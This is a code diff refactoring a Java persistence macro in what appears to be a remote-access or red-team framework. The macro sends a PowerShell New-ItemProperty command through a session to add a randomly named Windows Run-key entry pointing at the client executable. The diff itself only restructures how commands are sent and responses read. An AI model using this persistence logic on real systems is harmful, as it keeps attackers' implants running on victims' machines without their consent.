@@ -23,16 +23,9 @@ public class WindowStartupKey extends AbstractCommandMacro {
 	
 	public static final String NEW_RUNKEY_CMD = "powershell.exe -c \"New-ItemProperty -Path '$KEY_NAME$' -Name '$EXE_NAME$' -Value '$EXE_PATH$' -Force";
 	
-	private IOManager io;
-	
 	@Override
 	public boolean isCommandMatch(String cmd) {
 		return cmd.startsWith(TEST_WIN_RUNKEY_PERSISTENCE + " "); 
-	}
-
-	@Override
-	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
-		this.io = io;
 	}
 
 	@Override
@@ -51,10 +44,8 @@ public class WindowStartupKey extends AbstractCommandMacro {
 					return outcome;
 				}
 			}else {
-				io.sendCommand(sessionId, Commands.CLIENT_GET_EXE_CMD);
-				outcome.addSentCommand(Commands.CLIENT_GET_EXE_CMD);
-				String clientCmd = io.awaitMultilineCommands(sessionId);
-				outcome.addResponseIo(clientCmd);
+				sendCommand(Commands.CLIENT_GET_EXE_CMD, sessionId, outcome);
+				String clientCmd = awaitResponse(sessionId, outcome);
 				clientCmd = clientCmd.replace("\r", "");
 				clientCmd = clientCmd.replace("\n", "");
 				cmdForKey = clientCmd;
@@ -70,12 +61,9 @@ public class WindowStartupKey extends AbstractCommandMacro {
 			}
 			command = command.replace("$EXE_NAME$", StagerGenerator.generateRandomLetterString());
 			command = command.replace("$EXE_PATH$", cmdForKey);
-			outcome.addSentCommand(command);
-			io.sendCommand(sessionId, command);
+			sendCommand(command, sessionId, outcome);
 			
-			String response = io.awaitMultilineCommands(sessionId);
-			outcome.addResponseIo(response);
-			
+			awaitResponse(sessionId, outcome);
 		}
 		return outcome;
 	}
